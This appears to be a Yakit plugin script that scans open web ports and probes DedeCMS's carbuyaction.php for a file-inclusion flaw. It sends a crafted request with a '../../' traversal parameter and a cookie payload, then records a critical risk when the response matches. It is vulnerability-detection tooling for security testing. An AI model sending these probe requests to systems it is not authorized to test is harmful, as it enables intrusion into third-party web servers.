# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 
PacketGet = `GET /plus/carbuyaction.php?dopost=return&code=../../ HTTP/1.1
Host: {{params(target)}}
Cookie: {{params(payload)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`

//指纹识别规则  
fingerRules= []

addfingerRule =  func(packet,payload, check) {
    fingerRules = append(fingerRules, {
        "packet":packet,
        "payload": payload,
        "check": check,
    })
}

//添加具体的识别规则
addfingerRule(PacketGet,"code=alipay",func(rsp,header,body){
    if rsp.StatusCode == 200 {
        return true
    }
    return false
})

//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}

//填充对应的漏洞检测规则
addRule(PacketGet,`code=cod`,func(rsp,header,body){
    if rsp.StatusCode == 200 &&  str.MatchAnyOfSubString(body, `Cod::respond()`){
        return true
    }
    return false
},"文件包含","dedecms-carbuyaction-fileinclude","critical","https://www.cnblogs.com/milantgh/p/3615986.html")



//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}

//指纹识别handle
handlefingerRule = func(isTls,addr,rule){

    defer func{
        recover()
        return false
    }
    resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}))
    if err != nil {
        yakit.Error("poc.HTTP error: %v", err)
        return false
    }
    header, body = poc.Split(resp)
    rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
    urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
    url = urlIns.String()
    if rule.check(rspIns,header,body){
        return true
    }
    return false

}


handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }

    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
    fingerHit = false
    //指纹识别
    for _, fingerRule = range fingerRules {
    
        if  handlefingerRule(isTls, addr, fingerRule) {
            fingerHit = true
            break
        }
     
    }
    if !fingerHit {
        return 
    }

 
    //漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
